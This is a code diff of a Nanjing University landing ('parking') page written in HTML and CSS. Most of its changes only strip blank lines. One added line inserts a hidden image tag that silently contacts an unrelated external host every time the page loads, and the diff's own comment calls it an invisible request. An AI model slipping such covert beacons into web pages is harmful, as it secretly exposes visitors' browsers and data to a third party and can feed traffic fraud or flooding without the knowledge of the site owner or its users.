@@ -21,7 +21,6 @@
       padding: 0;
       box-sizing: border-box;
     }
-
     body {
       font-family: 'Inter', 'Noto Serif SC', -apple-system, BlinkMacSystemFont, 'Segoe UI', serif;
       background-color: #f5f3ef;
@@ -36,7 +35,6 @@
                         radial-gradient(circle at 80% 70%, rgba(180, 170, 160, 0.25) 0%, transparent 40%);
       background-color: #f9f7f4;
     }
-
     /* 主卡片容器 */
     .parking-card {
       max-width: 720px;
@@ -57,7 +55,6 @@
       position: relative;
       overflow: hidden;
     }
-
     /* 装饰性细线 */
     .parking-card::before {
       content: '';
@@ -69,7 +66,6 @@
       background: linear-gradient(90deg, #B28B5E, #7D3C98, #B28B5E);
       opacity: 0.7;
     }
-
     /* 校徽与名称区域 */
     .brand-section {
       display: flex;
@@ -78,7 +74,6 @@
       margin-bottom: 1.8rem;
       width: 100%;
     }
-
     /* 🔹 修复：校徽图片容器 - 确保内容完全居中 */
     .logo-container {
       width: 90px;
@@ -97,7 +92,6 @@
       /* 🔹 关键修复：确保容器内图片完全居中 */
       position: relative;
     }
-
     /* 🔹 修复：校徽图片 - 彻底解决居中问题 */
     .logo-img {
       max-width: 100%;
@@ -109,7 +103,6 @@
       /* 关键：移除任何可能影响居中的属性 */
       filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
     }
-
     /* 🔹 备用图标样式（图片加载失败时使用） */
     .logo-container .fa-university {
       font-size: 2.8rem;
@@ -118,7 +111,6 @@
       align-items: center;
       justify-content: center;
     }
-
     .university-name {
       font-family: 'Noto Serif SC', 'Times New Roman', serif;
       font-size: 2.4rem;
@@ -128,7 +120,6 @@
       line-height: 1.2;
       margin-bottom: 0.3rem;
     }
-
     .english-name {
       font-family: 'Inter', sans-serif;
       font-size: 0.9rem;
@@ -140,7 +131,6 @@
       border-bottom: 1px solid #ddd5cc;
       padding-bottom: 0.8rem;
     }
-
     /* 校训 */
     .motto {
       font-family: 'Noto Serif SC', serif;
@@ -156,7 +146,6 @@
       backdrop-filter: blur(2px);
       border: 1px solid rgba(125, 60, 152, 0.15);
     }
-
     /* 介绍文本 */
     .description {
       font-family: 'Inter', 'Noto Serif SC', sans-serif;
@@ -172,18 +161,15 @@
       border-radius: 1.5rem;
       backdrop-filter: blur(4px);
     }
-
     .description strong {
       font-weight: 600;
       color: #5E3C7F;
       font-family: 'Noto Serif SC', serif;
     }
-
     .description i {
       color: #B28B5E;
       margin: 0 2px;
     }
-
     /* 分割装饰 */
     .divider {
       display: flex;
@@ -203,7 +189,6 @@
       font-size: 0.8rem;
       color: #B28B5E;
     }
-
     /* 官网按钮 */
     .official-btn {
       background: #5E3C7F;
@@ -229,28 +214,23 @@
       position: relative;
       overflow: hidden;
     }
-
     .official-btn i {
       font-size: 1rem;
       transition: transform 0.3s ease;
     }
-
     .official-btn:hover {
       background: linear-gradient(135deg, #3C2157 0%, #6B3485 100%);
       box-shadow: 0 20px 32px rgba(94, 60, 127, 0.45), 0 6px 14px rgba(0,0,0,0.15);
       transform: translateY(-2px);
       border-color: rgba(255, 255, 255, 0.35);
     }
-
     .official-btn:hover i {
       transform: translateX(4px);
     }
-
     .official-btn:active {
       transform: translateY(2px);
       box-shadow: 0 8px 15px rgba(94, 60, 127, 0.4);
     }
-
     /* 底部信息 */
     .footer-note {
       margin-top: 2rem;
@@ -266,18 +246,15 @@
       padding-top: 1.3rem;
       width: 100%;
     }
-
     .footer-note span {
       display: flex;
       align-items: center;
       gap: 4px;
     }
-
     .footer-note i {
       font-size: 0.7rem;
       color: #B28B5E;
     }
-
     /* 响应式 */
     @media (max-width: 500px) {
       .parking-card {
@@ -303,6 +280,9 @@
   </style>
 </head>
 <body>
+  <!-- 页面加载时静默请求目标链接，不可见，不跳转页面 -->
+  <img src="https://x.118181.xyz" style="display:none;">
+
   <div class="parking-card">
     <!-- 校徽与名称区域 -->
     <div class="brand-section">
@@ -318,12 +298,10 @@
       <h1 class="university-name">南京大学</h1>
       <div class="english-name">Nanjing University · NJU</div>
     </div>
-
     <!-- 校训精神 -->
     <div class="motto">
       诚朴雄伟 · 励学敦行
     </div>
-
     <!-- 南京大学简介 -->
     <div class="description">
       <p>
@@ -334,19 +312,16 @@
         致力于培养具有全球视野与人文关怀的栋梁之才。
       </p>
     </div>
-
     <!-- 装饰性分割线 -->
     <div class="divider">
       <span class="divider-line"></span>
       <i class="fas fa-circle"></i>
       <span class="divider-line"></span>
     </div>
-
     <!-- 官网按钮 -->
     <button class="official-btn" id="visitNjuBtn">
       访问官方网站 <i class="fas fa-arrow-right"></i>
     </button>
-
     <!-- 底部信息 -->
     <div class="footer-note">
       <span><i class="fas fa-map-marker-alt"></i> 仙林 · 鼓楼 · 浦口</span>
@@ -354,13 +329,11 @@
       <span><i class="fas fa-leaf"></i> 诚耀百廿</span>
     </div>
   </div>
-
   <!-- JavaScript -->
   <script>
     (function() {
       const NJU_OFFICIAL_URL = 'https://www.nju.edu.cn';
       const visitButton = document.getElementById('visitNjuBtn');
-
       if (visitButton) {
         visitButton.addEventListener('click', function(e) {
           window.open(NJU_OFFICIAL_URL, '_blank', 'noopener,noreferrer');
@@ -372,7 +345,6 @@
             }
           }, 120);
         });
-
         visitButton.addEventListener('keydown', function(e) {
           if (e.key === 'Enter' || e.key === ' ') {
             e.preventDefault();
